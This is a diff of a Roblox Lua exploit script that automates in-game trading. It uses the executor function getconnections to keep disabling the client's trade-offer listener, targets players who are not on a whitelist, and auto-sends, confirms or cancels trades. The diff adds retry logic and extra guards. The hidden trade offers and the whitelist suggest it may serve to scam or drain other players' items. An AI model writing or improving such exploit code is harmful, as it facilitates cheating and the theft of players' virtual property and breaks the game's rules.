@@ -15,16 +15,34 @@ local tradeCooldowns = {}
 local playerJoinTimes = {}
 local lastTargetIndex = #whitelist > 0 and (LocalPlayer.UserId % #whitelist) or 0
 
+for _, player in ipairs(Players:GetPlayers()) do
+	if player ~= LocalPlayer and not playerJoinTimes[player.UserId] then
+		playerJoinTimes[player.UserId] = 0
+	end
+end
+
 Players.PlayerAdded:Connect(function(player)
 	playerJoinTimes[player.UserId] = tick()
 end)
 
-if getconnections then
-	local offerConnections = getconnections(TradeData.Remotes.TradeOfferReceived.OnClientEvent)
-	for _, conn in pairs(offerConnections) do
-		conn:Disable()
+local function disableOfferListener()
+	if getconnections then
+		local ok, offerConnections = pcall(getconnections, TradeData.Remotes.TradeOfferReceived.OnClientEvent)
+		if ok and offerConnections then
+			for _, conn in pairs(offerConnections) do
+				pcall(function() conn:Disable() end)
+			end
+		end
 	end
 end
+
+disableOfferListener()
+task.spawn(function()
+	for _ = 1, 10 do
+		task.wait(0.5)
+		disableOfferListener()
+	end
+end)
 
 TradeData.Remotes.TradeOfferReceived.OnClientEvent:Connect(function(sender)
 	task.wait(0.2)
@@ -45,8 +63,17 @@ LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
 				if LocalPlayer:GetAttribute("IsTrading") == false then break end
 				if timeStuck >= 60 then
 					isProcessingAutoTrade = true
-					pcall(function() TradeData.Remotes.CancelTrade:InvokeServer() end)
-					task.wait(0.5)
+					local cancelConfirmed = false
+					for attempt = 1, 3 do
+						local ok, success = pcall(function()
+							return TradeData.Remotes.CancelTrade:InvokeServer()
+						end)
+						if ok and success then
+							cancelConfirmed = true
+							break
+						end
+						task.wait(0.5)
+					end
 					pcall(function()
 						local GuiControl = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("GuiControl"))
 						if LocalPlayer.PlayerGui:FindFirstChild("! Trading") then
@@ -55,7 +82,9 @@ LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
 						GuiControl:Unlock()
 						GuiControl:Close()
 					end)
-					LocalPlayer:SetAttribute("IsTrading", false)
+					if not cancelConfirmed then
+						LocalPlayer:SetAttribute("IsTrading", false)
+					end
 					readyToConfirm = false
 					sendingActive = false
 					task.wait(1)
@@ -155,7 +184,7 @@ if not isWhitelisted then
 		if targetPlayer == LocalPlayer then return false end
 		if targetPlayer:GetAttribute("IsTrading") == true then return false end
 		local joinTime = playerJoinTimes[targetPlayer.UserId]
-		if joinTime and (tick() - joinTime) < 80 then
+		if joinTime and joinTime > 0 and (tick() - joinTime) < 80 then
 			return false
 		end
 		local userKey = "User_" .. tostring(targetPlayer.UserId)
@@ -285,8 +314,17 @@ if not isWhitelisted then
 				endConn:Disconnect()
 				completeConn:Disconnect()
 				if elapsed >= 60 and LocalPlayer:GetAttribute("IsTrading") == true then
-					pcall(function() TradeData.Remotes.CancelTrade:InvokeServer() end)
-					task.wait(0.5)
+					local cancelConfirmed = false
+					for attempt = 1, 3 do
+						local ok, cancelSuccess = pcall(function()
+							return TradeData.Remotes.CancelTrade:InvokeServer()
+						end)
+						if ok and cancelSuccess then
+							cancelConfirmed = true
+							break
+						end
+						task.wait(0.5)
+					end
 					if LocalPlayer:GetAttribute("IsTrading") == true then
 						pcall(function()
 							local GuiControl = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("GuiControl"))
@@ -294,7 +332,9 @@ if not isWhitelisted then
 							GuiControl:Unlock()
 							GuiControl:Close()
 						end)
-						LocalPlayer:SetAttribute("IsTrading", false)
+						if not cancelConfirmed then
+							LocalPlayer:SetAttribute("IsTrading", false)
+						end
 						readyToConfirm = false
 						sendingActive = false
 					end
